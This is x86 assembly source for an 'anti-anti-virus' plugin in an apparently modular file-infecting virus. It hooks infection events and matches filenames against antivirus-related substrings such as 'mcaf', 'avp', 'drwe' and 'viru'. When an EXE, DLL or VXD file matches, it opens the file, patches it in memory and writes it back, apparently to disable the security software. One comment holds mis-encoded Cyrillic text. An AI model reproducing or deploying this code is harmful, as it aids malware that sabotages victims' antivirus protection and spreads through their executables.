   ; AAV
   ; ~~~
   ; - anti-anti-virus
   ;   þ patch given code buffer
   ;   þ bad-filename detection
   ; - if filename is 'bad': do not infect it, but patch
   ;

   include                 INCLUDE\consts.inc
   include                 infmanx.inc
   include                 extman.inc
   include                 rxio.inc
   include                 memory.inc
   include                 fastname.inc

   include                 plugin.inc
                           PLUGIN_START    AAV, CODE32, PERMUTABLE

   handleevent:            hookevent EV_AAV_BUF, _buf
                           hookevent EV_INFMANX_BEFORE_FILE, _infmanxbuf
                           hookevent EV_AAV_ISBADNAME, _isbadname
                           hookevent EV_EXTMAN_GOT_FILENAME, _anyfile
                           stc
                           retn

   ; input: ESI/ECX
   ; returns: EAX=# bytes modified

   _buf:                   call    patch_buffer
                           stc
                           retn

   _infmanxbuf:            pusha
                           call    patch_buffer
                           popa
                           stc     ; keep event
                           retn

   ; input:  EDX=filename (may contain paths, etc.)
   ; output: CF==0 (event handled)   -- really bad name
   ;         CF==1 (event unhandled) -- normal name

   _isbadname:             pusha

   __cycle:                mov     eax, [edx]
                           inc     edx

                           or      al, al
                           jz      __exit_normal

                           or      eax, 20202020h
                           neg     eax

                           cmp     eax, -'itna'    ; anti
                           je      __exit_bad
                           cmp     eax, -'sdia'    ; aids
                           je      __exit_bad
                           cmp     eax, -'uriv'    ; viru
                           je      __exit_bad

                           cmp     eax, -'ewrd'    ; drwe
                           je      __exit_bad
                           cmp     eax, -'facm'    ; mcaf
                           je      __exit_bad
                           cmp     eax, -'nida'    ; adinä ¢ ¯®«¥ ¥ ¢®¨ ;-)
                           je      __exit_bad

                           sal     eax, 8
                           sar     eax, 8

                           cmp     eax, -'pva'     ; avp
                           je      __exit_bad

                           jmp     __cycle

   __exit_normal:          popa
                           stc     ; normal name: keep event
                           retn

   __exit_bad:             popa
                           clc     ; bad name: event handled
                           retn

   ; input: EDX=filename
   ;        ECX=ext

   _anyfile:               pusha

                           xor     edi, edi

                           neg     ecx
                           cmp     ecx, -EXT_EXE
                           je      __fuck
                           cmp     ecx, -EXT_DLL
                           je      __fuck
                           cmp     ecx, -EXT_VXD
                           jne     __exit
   __fuck:

                           call    _isbadname
                           jc      __exit  ; normal name - exit

                           event   EV_FASTNAME_ISNEWFILE
                           jnc     __exit

   ; read into memory; patch buffer; write back

                           event   EV_rx_fopen_ro
                           jc      __exit
                           xchg    ebx, eax
                           event   EV_rx_fgetsize
                           xchg    ecx, eax
                           event   EV_MEMORY_MALLOC
                           xor     esi, esi
                           event   EV_rx_fread
                           mov     esi, edx
                           call    patch_buffer
                           xchg    edi, eax
                           or      edi, edi
                           jz      __skipupd
   IFDEF   DEBUG
                           nop
   ELSE
                           event   EV_rx_fclose
                           push    edx
                           mov     edx, [esp+4].pusha_edx
                           event   EV_rx_fcreate
                           pop     edx
                           xchg    ebx, eax
                           xor     esi, esi
                           event   EV_rx_fwrite
   ENDIF ; DEBUG

   __skipupd:              event   EV_MEMORY_MFREE
                           event   EV_rx_fclose
   __exit:
                           or      edi, edi ; edi==0 AL=1 CF=1 STC - keep event
                                            ; edi!=0 AL=0 CF=0 CLC - handled
                           sete    al
                           shr     eax, 1

                           popa
                           retn

   include                 aavpatch.inc

                           PLUGIN_END
